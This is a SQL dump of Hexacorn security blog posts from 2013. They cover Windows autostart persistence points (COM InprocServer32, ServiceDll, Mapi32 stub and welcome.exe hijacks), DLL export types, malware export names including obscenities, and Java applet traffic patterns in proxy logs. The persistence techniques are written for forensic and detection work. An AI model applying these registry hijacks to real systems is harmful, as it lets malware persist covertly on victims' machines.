debugger path to lead its own executable anytime the debugger is launched and this way making it kinda persistent on the system. Kinda, as the .exe will be executed only on rare occasion when the debugger is actually being installed (developer’s or power user’s machine).\nOther issue is that the launching of the script debugger takes more steps than just looking up the value n the registry and launching the appropriate application.\nWhen VBScript tries to find the debugger it talks to few COM components first (e.g. Process Debug Manager) so in order to make it work, one would need to also register these COM components (if you want to know more details, install WSD and see registry changes associated with the installation).\nHijacking Process Debug Manager\nThe alternative persistence mechanism could hijack one of these COM components that VBScript ‘talks to’ and replace its server path to point to a malicious file. The DLL does not even need to implement any COM functionality and it’s enough for it to be a simple, loadable library. The Process Debug Manager that I mentioned earlier could do the trick here. Its CLSID’s value on a system where WSD is installed is shown below:\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\\r\n{78A51822-51F4-11D0-8F20-00805F2CD064}\\InprocServer32]\r\n@=\"C:\\\\WINDOWS\\\\system32\\\\pdm.dll\"\nPointing InprocServer32 to a malicious DLL would load anytime VBScript (or any other module) is ‘consulting’ ProcessDebugManager.\nServiceDll Hijack\nMany entries under\n\n\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services]\n\n\ncan be hijacked by swapping their ServiceDll parameter to point to a malicious entry. e.g. the Remote Access Service registry entry\n\n\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\\r\nServices\\RemoteAccess\\Parameters]\n\n\nnormally points to\n\n\n%SystemRoot%\\System32\\mprdim.dll\n\n\nbut it can be changed to point to a malicious component. There are many default services that could be hijacked this way.\nMapi32 Stub Library\nOlder versions of Outlook 2007 allowed to add extra functionality to Outlook by means of installing a custom version of mapi32.dll in the system directory as explained in this article.\nThe relevant Mapi32.dll Stub Registry Settings are provided in the Registry in the following location:\n\n\n[HKEY_LOCAL_MACHINE\\Software\\Clients\\Mail::(default)]\n\n\nDLLPath\nFull path to the Simple MAPI provider DLL.\n\nDLLPathEx\nFull path to the MAPI provider DLL. Provider DLLs that support both Simple MAPI and MAPI must have both keys set.\n\n\n\nObviously, this mechanism is a perfect target for abuse.\nHijacking Client executables\nThe Registering Programs with Client Types article from Microsoft explains on ‘how to register a program in the Windows registry as one of the following client types: browser, email, media playback, instant messaging, or virtual machine for Java.’. Looking at the registry entries associated with these registration we can find the following key:\n\n\n[HKEY_LOCAL_MACHINE\\Software\\Clients\\]\n\n\nMany applications listed under this key can be hijacked e.g. Mail program contain keys that point to executables::\n\n\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Clients\\Mail\\Windows Mail\\InstallInfo]\n\n\nHideIconsCommand\n\n\nReinstallCommand\n\n\nShowIconsCommand\n\n\n\n\nWindows 2000 Welcome\nInstallation of Windows 2000 always ends up with the “Getting Started with Windows 2000” window shown on the screen after the system restarts. User has an option to disable it, but the box is ticked ON by default.\nThe window shows up as a result of welcome.exe being executed from the following location:\n\n\nC:\\WINNT\\Welcome.exe\n\n\nThe flag that determines whether the welcome.exe is executed or not is stored in the following Registry location:\n\n\n[HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\\r\ntips\\Show: 0x00000001]\n\n\nReplacing welcome.exe and ensuring the value of Show is equal to 1 will make the C:\\WINNT\\Welcome.exe execute every time system starts.\nWell, not quite.\nIf the file is replaced, it will be ‘magically’ restored from the following location:\n\n\nc:\\WINNT\\system32\\dllcache\\welcome.exe\n\n\nSo, the malware needs to be copied into 2 locations, and… the Windows File Protection needs to be disabled as well \nThanks for reading and see you in the Part 5.\nShare this :)', 'Anti-Forensics, Autostart (Persistence), Compromise Detection, Forensic Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2013/09/19/beyond-good-ol-run-key-part-4/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (300, 'Permanent Link to Sandboxing and Message Box Default Reply (Error Message Instrument)', 'Hexacorn', 'September 3, 2013 ', 'I have read about Message Box Default Reply the other day and it crossed my mind that it could be used to help with some aspects of sandbox automation.\nWhat is Message Box Default Reply? Windows supports a mechanism that enables a default reply for MessageBox windows; that is – it automatically ‘clicks’ for you a default button on the message boxes.\nTo enable it, all you have to do is to create a EnableDefaultReply value in Registry as shown below and restart the system\n[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Error Message Instrument]\r\n \"EnableDefaultReply\"=dword:00000001\nOnce the key is set and computer restarted, all standard message boxes will be automatically ‘clicked’. Check the link provided above as the mechanism enables logging and offers a few other settings which are covered in detail on Microsoft web pages.\nShare this :)', 'Batch Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2013/09/03/sandboxing-and-message-box-default-reply-error-message-instrument-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (301, 'Permanent Link to Da Li’L World of DLL Exports and Entry Points, Part 3', 'Hexacorn', 'August 21, 2013 ', 'The third part of the series (Part 1, Part2) is just a list of as many types of DLL described on MSDN as I could find by quickly googling around. I am pretty sure these are not all, but cover at least the most common ones. If you see anything wrong, or missing, please let me know. Thx!\nComponent Object Model (COM) DLL\nProvides COM functionality. These below are functions executed when you run “regsrv32.exe”  and “regsrv32.exe /u” and when programs communicate / use the COM objects implemented via the DLL.\n\nHow to recognize?\n\nSubsystem: Windows\nTypical file extension: DLL/OCX/VBX\nExported functions:\n\nDllGetClassObject – Retrieves the class object from a DLL object handler or object application.\nDllRegisterServer – Instructs an in-process server to create its registry entries for all classes supported in this server module.\nDllUnregisterServer – Instructs an in-process server to remove only those entries created through DllRegisterServer.\nDllCanUnloadNow – Determines whether the DLL that implements this function is in use. If not, the caller can unload the DLL from memory.\nDllInstall – Not required, but may be present.\n\n\n\n\n\nKernel Mode DLL\n\nThese are best described in a “classic” document entitled “DLLs in Kernel Mode” written by Tim Roberts.\n\nHow to recognize?\n\nSubsystem: Native\nTypical file extension: SYS/DLL\nExported functions:\n\nDllInitialize – The system calls a kernel-mode DLL’s DllInitialize routine immediately after the DLL is loaded.\nDllUnload -The system calls a kernel-mode DLL’s DllUnload routine before it unloads the DLL.\n\n\n\n\n\nService DLL\n\nThese are hosted by svchost. Another ‘classic; on the subject is a document written by Geoff Chappell’s.\n\nHow to recognize?\n\nSubsystem: Windows\nTypical file extension: DLL\nExported functions:\n\nServiceMain – The entry point for a service.\nSvchostPushServiceGlobals – this function does not need to be implemented, but if it is, it will be called before ServiceMain.\n\n\n\n\n\nControl Panel application DLL\n\nAnytime you open Control Panel and change the system settings you are running a small applications called Control Panel Applets. They are implemented as DLL. They can be controlled either via Rundll32/Control_RunDLL or control.exe.\n\nHow to recognize?\n\nSubsystem: Windows\nTypical file extension: CPL\nExported functions:\n\nCPlApplet – Serves as the entry point for a Control Panel application.\n\n\n\n\n\nInstallable Drivers DLL\n\nAudio Compression Manager Drivers (ACM).\n\nHow to recognize?\n\nSubsystem: Windows\nTypical file extension: ACM, AX, DRV, DLL\nExported functions:\n\nDriverProc – Serves as the entry point for a Control Panel application.\nAboutDialogProc – Occasionally may be found in the installable drivers, but not required. Handles messages from ‘About’ window.\nConfigureDialogProc – Occasionally may be found in the installable drivers, but not required. Handles messages from ‘Configure’ window.\nDriverDialogProc – Occasionally may be found in the installable drivers, but not required. Handles messages from ‘Configure’ window (alternative name).\n\n\n\n\n\nAudio Device Messages for MIDI\nThese are same as installable driver DLLs, but have extra functions exported to process the window messages (some of them seem to be legacy and no longer documented on MSDN).\n\nHow to recognize?\n\nTypical file extension: DRV, DLL\nExported functions:\n\nDriverProc – Processes driver messages for the installable driver (note: MSDN has at least two pages about DriverProc).\nmodMessage – An entry-point function for musical instrument digital interface (MIDI) output drivers and for internal synthesizer drivers\nmodmCallback – An internal callback function provided to midi API that doesn’t need to be exported, but can be sometimes found.\nwodMessage – Entry-point function for waveform output drivers.\nwidMessage – Entry-point function for waveform input drivers.\nmidMessage – Entry-point function for MIDI input drivers.\nmxdMessage – Entry-point function for mixer drivers.\nauxMessage- Entry-point function for auxiliary audio drivers.\n\n\n\n\n\nFile Manager Extension\nThis is a very old type of DLL – an extension to a File Manager.\n\nHow to recognize?\n\nTypical file extension: DLL\nExported functions:\n\nFMExtensionProc – Called by the File Manager.\n\n\n\n\n\nNetShell helper DLL\nThese support netsh.exe tool by providing a ‘coverage’ for a specific network functionality. See details here.\n\nHow to recognize?\n\nTypical file extension: DLL\nExported functions:\n\nInitHelperDll – Called by NetShell (netsh.exe) to perform an initial loading of a helper.\n\n\n\n\n\nCredential Manager DLL\nCalled by Multiple Provider Router (MPR) and support Credential Manager (malware / hack tools can use it to sniff credentials). More details here.\n\nHow to recognize?\n\nTypical file extension: DLL\nExported functions:\n\nNPLogonNotify – Called when logon event occurs.\nNPPasswordChangeNotify – Called when password change event occurred.\n\n\n\n\n\nIIS Server Extension (ISAPI filter) DLL\nI mentioned ISAPI filters in my older post.\n\nHow to recognize?\n\nTypical file extension: DLL\nExported functions:\n\nGetExtensionVersion  – first entry-point function in IIS (for registration)\nHttpExtensionProc – main entry point for an ISAPI extension (doing all the dirty work)\nTerminateExtension – optional,  unloads the ISAPI DLL\n\n\n\n\n\nWeb Filter DLL\nWeb filters detect and process HTTP request notifications. See MSDN for more details and information about what pairs of APIs listed below need to be exported.\n\nHow to recognize?\n\nTypical file extension: DLL\nExported functions:\n\nGetFilterVersion –  Called to register for event notifications.\nHttpFilterProc – Called whenever an event for which the filter has registered in the GetFilterVersion function occurs.\nGetWPXFilterVersion – Called to register for the event notifications that were introduced in ISA Server 2004.\nHttpWPXFilterProc – Called whenever an event for which the filter has registered in GetWPXFilterVersion occurs.\nTerminateFilter – Called to notify the filter that it will be removed from memory.\nReloadWPXFilterConfiguration – Called to notify the filter that changes to the configuration of the ISA Server administration COM objects have been applied.\n\n\n\n\n\nRAS Administration DLL\nThe RAS Administration DLL exports functions that the RAS server calls whenever a user tries to connect or disconnect.See more details here.\n\nHow to recognize?\n\nSubsystem: Windows\nTypical file extension: DLL\nExported functions (not all must be implemented, see this MSDN article):\n\nMprAdminAcceptNewLink – Remote Access Service (RAS) calls the MprAdminAcceptNewLink function each time a link is created for a particular connection.\nMprAdminInitializeDll – Called when the Routing and Remote Access Service (RRAS) starts.\nMprAdminLinkHangupNotification – Called  whenever a link for a particular connection is dismantled.\nMprAdminTerminateDll – Called when the RAS shuts down.\nMprAdminAcceptNewConnection – Remote Access Service calls this function each time a new user dials in and successfully completes RAS authentication\nMprAdminConnectionHangupNotification – Remote Access Service calls this function after the last link for the specified connection has been dismantled.\nMprAdminAcceptNewConnection2 – Remote Access Service calls this function each time a new user dials in and successfully completes RAS authentication\nMprAdminConnectionHangupNotification2 – Remote Access Service calls this function after the last link for the specified connection has been dismantled.\n\n\n\n\n\nWinlogon GINA DLLs\n\nAn ‘old -school’ (old, because no longer available on Windows Server 2008 and Windows Vista); it was a replacement for GINA DLL (another type of DLL that was often used to sniff passwords)\n\nHow to recognize?\n\nSubsystem: Windows\nTypical file extension: DLL\nExported functions:\n\nWlxActivateUserShell – Activates the user shell program.\nWlxDisplayLockedNotice – Allows the GINA to display information about the lock, such as who locked the workstation and when it was locked.\nWlxDisplaySASNotice – Called when no user is logged on.\nWlxDisplayStatusMessage – Called when the GINA DLL should display a message.\nWlxGetConsoleSwitchCredentials – Called to read the currently logged on user’s credentials to transparently transfer them to a target session.\nWlxGetStatusMessage – Called to get the status message being displayed by the GINA DLL.\nWlxInitialize – Called once for each window station present on the computer. Currently, the operating system supports one window station per workstation.\nWlxIsLockOk – Called before attempting to lock the workstation.\nWlxIsLogoffOk – Called when the user initiates a logoff operation.\nWlxLoggedOnSAS – Called when it receives a secure attention sequence (SAS) event while the user is logged on and the workstation is not locked.\nWlxLoggedOutSAS – Called when it receives a secure attention sequence (SAS) event while no user is logged on.\nWlxLogoff – Called to notify the GINA of a logoff operation on this workstation, allowing the GINA to perform any logoff operations that may be required.\nWlxNegotiate – The WlxNegotiate function must be implemented by a replacement GINA DLL. This is the first call made by Winlogon to the GINA DLL. WlxNegotiate allows the GINA to verify that it supports the installedversion of Winlogon.\nWlxNetworkProviderLoad – Called to collect valid authentication and identification information.\nWlxRemoveStatusMessage – Called to tell the GINA DLL to stop displaying the status message.\nWlxScreenSaverNotify – Called immediately before a screen saver is activated, allowing the GINA to interact with the screen saver program.\nWlxShutdown – Called just before shutting down, allowing the GINA to perform any shutdown tasks, such as ejecting a smart card from a reader.\nWlxStartApplication – Called when the system needs an application to be started in the context of the user.\nWlxWkstaLockedSAS – Called when it receives a secure attention sequence (SAS) and the workstation is locked.\n\n\n\n\n\nResource DLL \nThe Resource DLL functions allow the Cluster service to manage resources indirectly through a Resource Monitor and a resource DLL. See more on MSDN.\n\nHow to recognize?\n\nSubsystem: Windows\nTypical file extension: DLL\nExported functions:\n\nArbitrate – Allows a node to attempt to regain ownership of a quorum resource.\nClose – Removes a resource instance from the cluster.\nIsAlive – Determines if a resource is actually operational.\nLooksAlive – Determines if a resource appears to be available for use.\nOffline – Performs a graceful shutdown of the resource.\nOnline – Starts the resource and makes it available to the cluster.\nOpen – Creates a new resource instance.\nRelease – Releases a quorum resource from arbitration.\nResourceControl – Supports resource control codes.\nResourceTypeControl – Supports resource type control codes.\nStartup – Receives the LogEvent and SetResourceStatus callbacks and returns a function table.\nTerminate – Performs an immediate shutdown of the resource..\n\n\n\n\n\nMAPI Service Provider DLL\nThese extend MAPI functionality. See more details here.\n\nHow to recognize?\n\nSubsystem: Windows\nTypical file extension: DLL\nExported functions:\n\n\n\nMSProviderInit – Implemented by Message store providers.\nXPProviderInit – Implemented by Transport providers.\nABProviderInit – Implemented by Address book providers.\n\n\n\n\nWinRT Component DLLs\nThis is a relatively new type of DLL that is being used by Metro applications under Windows 8.\n\nHow to recognize?\n\nSubsystem: Windows\nTypical file extension: DLL\nExported functions:\n\nDllGetActivationFactory – Retrieves the activation factory from a DLL that contains activatable Windows Runtimeclasses. A very enigmatic sounding description means that the DLL implements widgets for Metro.\n\n\n\n\n\nShare this :)', 'Batch Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2013/08/21/da-lil-world-of-dll-exports-and-entry-points-part-3/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (302, 'Permanent Link to Da Li’L World of DLL Exports and Entry Points, Part 2', 'Hexacorn', 'August 11, 2013 ', 'The first part of the series talked about the ‘main’ entry points of the DLL. These are almost always there and it’s easy to understand their functionality and follow their code flow\nBUT…\nIf you do reversing a lot you for sure know that looking at the files of this type (i.e. reversing them) is always a bit of a challenge as it’s quite common for them to be implementing some functionality via many other exports, and often not all of them are very easy to understand or analyze (e.g. COM libraries and asynchronously called stuff); plus, on top of that there is really a lot of different types of DLLs and DLL exports out there. This leads us to an obvious question:\n\nWhat DLL types and exports are actually out there?\n\nTo answer this question the easiest way is to run a script that will extract this information from a collection of PE files e.g. from your Windows directory. The script will simply parse the PE file, extract the information on what functions are exported via ‘default’ OS files and generate some stats. This is a good approach, but doesn’t take into account many aspects of a ‘big picture of DLL programming’ which includes:\n\nDLL implementing services that may not used on your flavor of Windows / applications\nDLL implementing services that are very specific, but rarely used\nOld, legacy types of DLL\nPlugins\nCreativity of software developers / malware authors\nand possibility a few other things\n\nWe obviously need a larger collection of samples.\nRunning the script over a few millions files including both malware and clean files I came up with a large list of possible exports with the top entries being as follows:\n\n___CPPdebugHook\n__GetExceptDLLinfo\n_LOADLIBRARY_DUMMY\nCancelDll\nCOMResModuleInstance\nDllCanUnloadNow\nDllGetClassObject\nDllMain\nDllRegisterServer\nDllUnregisterServer\nDriverProc\nJumpOff\nJumpOn\nKsCreateAllocator\nKsCreatePin\nKsCreateTopologyNode\nLoadDll\nmodmCallback\nmodMessage\nOutt\nServerMain\nServiceMain\nSett\nThreadPro\n… and lots more\n\nMany of these are easy to recognize and are very common; some are specific to certain families of malware and/or legitimate software. Some of these will be covered in the Part 3 of this series.\nAnd now, for the fun part.\nNSFW Warning: What follows may not be Safe for work  You have been warned \nI mentioned the creativity of software developers / malware authors being an interesting aspect of research. Indeed, there is a lot of exports that are named in a strange way and some of them are actually quite amusing.\nFor instance, some exported functions are (I removed name decoration from some of the functions for readability):\n\nSmileys\n\n(=_______=)\n\n\n“Funny” or intriguing names\n\nCauseOfDeath_enum\nCBloodSucking_DLLClass\nCreateBloodSucking\nDeathSequence\nhaha\nHaHaInstall\nHaHaUninstall\nParticles_Ghostbuster\nSillyMe\nyouaredog\nyour system is mine\nZombie_QueryInterface\nZoo\n\n\nObscenities, sex-related\n\n_IFeelLikeAShit\nasOsaretopExeshit\n_fuck\n_fuckAllProcesses\n_BangBangBang\nbitchcn\nFUCK\nFUCKYOU\nFuck\nFuck3\nFuckAlls\nFuckGIRLS\nFuckJM\nFuckJS\nFuckKb\nFuckKillVirus\nFuckMain\nFuckPLMM\nFuckTray\nFuckWorld\nStartFuck\nStopFuck\nWh4tsTh3Fuck\nfuck\nfuck007\nfuckOff\nfuckabc\nfuckyou\nmazafaka\n\n\nObscenities or love towards AV companies and other companies and other anti-av or anti-specific company sentiment (sometimes with typos)\n\nFUCK360\nFuck360\nFuckESETNOD32\nFuckKV360\nfuckingnod\nFuckKaspersky\nFuckRiSing\nFuckRising\nFuck_Drweb\nFuckkav\nKill360Box\nKIIsSes__McafEe\nKisses_Mcafee\nKisses_To_Mcafee\nKisses_To_Trojanhunter\nKisses_To_Tsojanhunter\nKisses_You_Mcafee\nKisses_hunter\nSoftnyxCanSuckMyDick\nDestoryAntiVirus\n\n\nNon-English names (and sometimes also obscenities)\n\nRussian\n\n_Zdes_Tebe_Ne_Hollywood_Ruki_Nogi_Otorvut (from Russian ‘Здесь тебе не Голливуд – руки-ноги оторвут’)\n\n\nJapanese\n\nあなたを愛し-  – I love you\n\n\nChinese\n\n操你全家TX___痞子专用鄙视TX – Literally: “fuck your whole family” and after a break ___”vulgar language specifically used by scumbags”\n操死你  – Fuck you to death.\n怪物技能 – Monster skills.\n怪物数量 – The number of monsters.\n秒杀队友 – Kill your team member in a second.\n模仿会员 – Member impostor.\n人物自杀 – Character suicide.\n搜索_怪物数量 – Find number of monsters.\n无敌 – Invincible.\n熊猫 – Panda.\n中国万岁 – Long live China.\n自杀 – Suicide.\n自慰 – Masturbation.\n快乐线程 – Happy thread.\n狙击连发 – Continuous  sniper firing.\n自动开枪 – Automatic fire.\n自动攻击 – Auto-attack\n\n\n\n\n\nExample of a DLL with Chinese exports (including some of these listed above) is shown below:\n\nShare this :)', 'Batch Analysis, Malware Analysis', 'http://www.hexacorn.com/blog/2013/08/11/da-lil-world-of-dll-exports-and-entry-points-part-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (303, 'Permanent Link to Da Li’L World of DLL Exports and Entry Points, Part 1', 'Hexacorn', 'August 8, 2013 ', 'This series is an attempt to bring together in one place various info scattered all over the place about numerous types of DLL Entry Points and DLL Exports. Knowing what functions are exported by specific DLL types helps in both identification of a file and its reverse engineering. Everything below is from a reverse engineer’s perspective i.e. what you see when you open a DLL in a RCE tool e.g. IDA Pro. Information provided here is based on a lot of sources yet it is quite condensed; if you want a nice starter about DLLs instead, please check this Microsoft support article What is a DLL? first.\nSince this is by no means an exhaustive list, and as I was researching it I was finding more and more stuff I started getting really insane while trying to make it all correct and nicely hyperlinked so please consider this to be a draft quality a.k.a. a WORK IN PROGRESS. If you spot any mistake please let me know. Thanks and see in you in a Part 2 soon!\nGeneric Exports\n\n\n.tls\n\nNot really an exported function per se, but since it may be present inside PE file I am mentioning it for completeness. Code potentially present inside .tls section (.tls callbacks) is executed on many ‘funny’ occasions. Do read Ange’s article to understand its quirks; it’s seriously @#$%^.\n\n\nDllEntryPoint\n\nA pseudo-export (unless really exported and I have actually seen it exported) so you will see it mainly inside programs for analysis e.g. IDA Pro. This is actually an entry point of the Portable Executable (note that on the source code level in high-level languages or RAD tools it is a place holder and it can be customized by a programmer so it can have some ‘funny’ stuff inside); This is where you start analysis, unless an RCE program finds DllMain for you (beware that DllMain can be empty yet DLL can be executing some code via modified DllEntryPoint, or .tls, or obviously – via other exports expected for certain types of DLLs).\n\n\nDllMain\n\nA main function for a non-.NET user-mode DLL (32- and 64-bit); does NOT need to be exported, but sometimes is. It is called by DllEntryPoint. If the DLL is written in an assembly language, often has the same address as DllEntryPoint.\n\n\n_CorDllMain\n\nNET entry point; it initializes the Common Language Run-Time (CLR) and starts the .NET DLL. It is called internally by DllEntryPoint on OSs not supporting .NET. Sometimes exports named like this are fake.\n\n\n\n\nLibMain / LibEntry\n\nDLL initialization entry point (16-bit). Newer DLLs use DllMain.\n\n\nDllInstall\n\nCan be quite common, handles installation and setup for a DLL. To be executed by regsvr32.exe, a command line argument “/i” needs to be used – as per Microsoft:\n\n\n\nTo use DllInstall with regsvr32, add a “/i” flag followed by a colon (:) and a string. The string will be passed to DllInstall as the pszCmdLine parameter. If you omit the colon and string, pszCmdLine will be set to NULL.\n\n___DllMainCRTStartup (DLLMainCRTStartup)\n\n  Run-time library Startup code. Calls DllMain internally.\n\n\nWEP (_WEP)\n\nExported by old DLLs (16-bit) and is called before the driver DLL is removed from memory (WEP=Windows Exit Program).\n\n\nLangDataCall\n\nAn export that can be found inside NLS*.dll on Windows 7; the function is called internally by NaturalLanguage6.dll.\n\n\n___CPPdebugHook\n\nA debug export often found in the projects created using Borland C++ Builder (BCB)/ Delphi. It provides a way for a program to communicate with the Borland debugger (note: it’s not a function, but a variable; debugger finds it and writes “2” changing the internal state of the RTL component which will result in debugger being notified about the events via RaiseException API with a magic value).\n\n\n__GetExceptDLLinfo\n\nAnother Borland-specific export used by a debugger. This one is actually a function which is called anytime the DLL is attached or a new thread is created.\n\n\n\nIf it is a lot and it’s confusing think of it this way:\n\nDllEntryPoint is like Start\nDllMain is like WinMain\n\nfor .exe files, and a code execution flow for a DLL is as follows:\nIf kernel mode DLL:\n\nDllInitialize\nthen DLL is doing stuff asynchronously\nthen DllUnload when DLL is unloaded\n\nIf user mode DLL, .NET:\n\n_CorDllMain (if ran on OS supporting .NET)\n\nIf user mode either not a .NET DLL, or .NET DLL used on a OS not supporting .NET:\n\n.tls callbacks (if exist)\nthen DllEntryPoint\nthen _CorDllMain (if .NET)\n\n\n\nthen  DLLMainCRTStartup (if exists)\n\n\n\nthen either DllEntryPoint or ___DllMainCRTStartup calls DllMain\nand asynchronously:\n\nspecifically named exports for specific protocols – see list below for examples\n.tls callbacks depending on circumstances (loading/unloading, creating/exiting threads)\n\n\n\n\nShare this :)', 'Malware Analysis', 'http://www.hexacorn.com/blog/2013/08/08/da-lil-world-of-dll-exports-and-entry-points-part-1/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (304, 'Permanent Link to 3R update', 'Hexacorn', 'August 8, 2013 ', 'I finally found a second to update 3R to cover the Regripper plugins from 29th of April. Oops. It’s been a while \nShare this :)', '3R, Forensic Analysis', 'http://www.hexacorn.com/blog/2013/08/08/3r-update/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (305, 'Permanent Link to Java – y u haz no class? (proxy logs patterns: class.class, com.class, edu.class, ', 'Hexacorn', 'July 9, 2013 ', 'TL;DR; This post explains why we see /class.class, /com.class, /edu.class, /net.class, /org.class in the proxy logs; The first one is a result of the .class file missing on the server, and four others are requested when Java applet code uses Javascript engine (Rhino).\nIntro\nProxy Log Analysis is an art of finding suspicious stuff in a HUGE amount of logs generated by the web traffic (and sometimes traffic on other ports as well) which is an evidence of:\n\nEmployees browsing internet\nEmployees doing something ‘funny’ (tunneling, proxy bypass, etc.)\nComputer running software connecting to the Internet\nSystem getting updates\nand… of course, malicious activity – both the one that indicates malware trying to sneak in on the system by means of a drive-by, and one that is a sign of malware actively running on the system.\n\nTypically, to analyze logs efficiently one employs a classification of the IPs/URLs/domain names, etc. provided by various vendors/engines automatically and/or utilize the IPs/Host names shared by various threat intel companies and groups. Other approaches include statistics, histograms, and in general data mining of your own logs in any possible way. I often prefer the latter, because the evidence of all web-based incidents in your org is all right there and only its analysis can help to find stuff AV, external threat intel and other security controls miss.\nThe patterns\nThe patterns that are the topic of this post are very characteristic and can help cherrypicking Java-specific badness in the logs. I (like many others) came across it during manual data mining and since I don’t recall seeing it described anywhere else, I thought it may be useful to document it. The other reason that motivated me to write this post is clarification. I noticed some researchers incorrectly attribute this legitimate Java traffic to exploit packs. While such traffic may be generated by a Java code that is a part of the exploit pack, the patterns themselves are NOT an indication of malware/exploit/drive-by activity.\nAll of these strange .class requests are a side-effect of a few things happening at the time the proxy hits the web server serving malicious content:\n\nLegitimate, clean Java file OR exploit pack is buggy or deployed incorrectly\nLegitimate, clean Java file OR exploit pack deployed correctly and working, but… removed since (we don’t care how)\nSpecific components of Java are being utilized\n\nIn other words, the reasons of  having the following requests:\n\n/class.class\n/com.class\n/edu.class\n/net.class\n/org.class\n\npresent in the web logs is Java itself when it is launched by a browser to render APPLET/EMBED/OBJECT HTML tags.\nSince it’s fun to experiment and you may want to do so yourself I am providing a bunch of examples that you can use to test the whole thing in your own lab.  The examples were executed on IE 8.0 with Java 1.6.\nRequests to a non-existing .class file\nWe write a simple HTML code, place it on the test web server and load it into an IE browser.\nThe code is as follows:\n<html>\r\n<applet code=\"code_only.class\" width=\"0\" height=\"0\"></applet>\r\n</html>\nWhen such code is rendered by the browser it will load Java and Java will request code_only.class file. If the file doesn’t exist on the server we will observe the following traffic:\nThe request to a non-existing code_only.class file ends up with Java requesting code_only/class.class file next.\nFrom the analyst’s perspective: searching for all instances of requests to /class.class in your logs may give you a list of potential new drive-by web sites (note, sometimes corporate web sites are buggy and you may see /class.class requests from non-malicious IPs too, so keep your eyes open!).\nRequests to a non-existing .class file, take 2\nSince we know that Java will request class.class file if it cannot find the original code_only.class file, we can try to place code_only/class.class file on the server and observe what happens when the same page is requested (ensure you clear both IE and Java cache before you do + kill java.exe instance!):\nNo surprises here, the file is actually downloaded.\nRequests to a non-existing archive (.jar) file\n<html>\r\n<applet archive=\"archive_only.jar\" width=\"0\" height=\"0\"></applet>\r\n</html>\nWhen such code is rendered and archive_only.jar doesn’t exist on the server, we will observe the following traffic:\nStrange. Why there is no traffic to archive_only.jar observed at all?\nIf you look at the HTML code above, you will notice that there is no code attribute.\nNo code == no rendering. Yes, it’s just a buggy HTML code. I put it here only for the sake of completeness, because from the analysis perspective, it has no value as you won’t be able to observe anything specific related to this behavior in the proxy logs at all (the traffic ‘doesn’t happen’ here).\nRequests to a non-existing archive (.jar) file, take 2\nOkay, we now add the code tag.\n<html>\r\n<applet archive=\"archive_and_code.jar\" code=\"archive_and_code.class\" width=\"0\" height=\"0\"></applet>\r\n</html>\nWhen such code is rendered we will observe the following traffic:\nThe request to a non-existing archive_and_code.jar is seen first, the request is repeated a few times and then an attempt is made by Java to load a non-existing archive_and_code.class file. Since it doesn’t exist either, it then makes request  to archive_and_code/class.class – same as in the first two cases discussed above.\nRequest to an existing archive (.jar) file, but without the proper class\nWe will use the same code:\n<html>\r\n<applet archive=\"archive_and_code.jar\" code=\"archive_and_code.class\" width=\"0\" height=\"0\"></applet>\r\n</html>\nand also drop a simple JAR (I just used a random zip archive) file named archive_and_code.jar on the server. It doesn’t contain the proper class.\nWhen such code is rendered we will observe the following traffic:\n\nThe request to a an existing archive_and_code.jar is seen first, and since in this case the archive doesn’t contain the actual archive_and_code.class class file, Java ignores it and goes on trying to load a non-existing archive_and_code.class file.\nSince it doesn’t exist either, it then makes Java request archive_and_code/class.class – all in all, almost the same behavior as in the earlier cases.\nRequest to an existing archive (.jar) file, and with a proper class file\nRe-using the same HTML code and jar file as in previous case, but adding archive_and_code.class file to it makes the request simpler – only the JAR file is requested.\nNo surprises here either. Java downloads the JAR file, extracts the .class file and executes code. If the file is corrupted, or completely incorrect file format it just ignores it (hopefully; perhaps there are still some 0days bugs waiting to be found in this area).\nGetting requests to com.class, edu.class, net.class, org.class\nOkay, at first these can be a bit puzzling as they very often appear in the logs in a very close proximity of requests related to exploit packs and it’s natural to assume they are part of malicious traffic. Well, to some extent they are, but as stated earlier – they are a side-effect of how Java engine behaves and are not result of specific requests made by an exploit pack or a malicious Java code.\nTurns out that the requests to these 4 classes is a result of applet code (could be an exploit pack but also a legitimate code) utilizing a ScriptEngineManager object which is an internal Java engine that can execute JavaScript. To see when exactly this behavior triggers, let’s try to implement a simple Java applet first:\nimport java.awt.*;\r\nimport java.applet.*;\r\nimport java.awt.event.*;\r\nimport javax.script.ScriptEngine;\r\nimport javax.script.ScriptEngineManager;\r\nimport javax.script.ScriptException;\r\n\r\npublic class call_ScriptEngineManager extends Applet \r\n{\r\n   public void init()\r\n   {\r\n    ScriptEngineManager factory = new ScriptEngineManager();    \r\n   }    \r\n}\nAll this code does is an instantiation of the ScriptEngineManager object.\nLaunching the applet from an HTML code:\n<html>\r\n<applet code=\"call_ScriptEngineManager.class\" width=\"0\" height=\"0\"></applet>\r\n</html>\nleads to the following traffic being generated:\nOops. It looks like the instantiation alone is not enough.\nOh well, obviously there is something missing in my code. ScriptEngineManager  is a manager of scripts, we need to tell it what engine we want to work with!\nLet’s modify the applet code pasted above and add one line requesting JavaScript engine to be instantiated:\nimport java.awt.*;\r\nimport java.applet.*;\r\nimport java.awt.event.*;\r\nimport javax.script.ScriptEngine;\r\nimport javax.script.ScriptEngineManager;\r\nimport javax.script.ScriptException;\r\n\r\npublic class call_ScriptEngineManager extends Applet \r\n{\r\n   public void init()\r\n   {\r\n    ScriptEngineManager factory = new ScriptEngineManager();\r\n    ScriptEngine engine = factory.getEngineByName(\"JavaScript\");\r\n   }    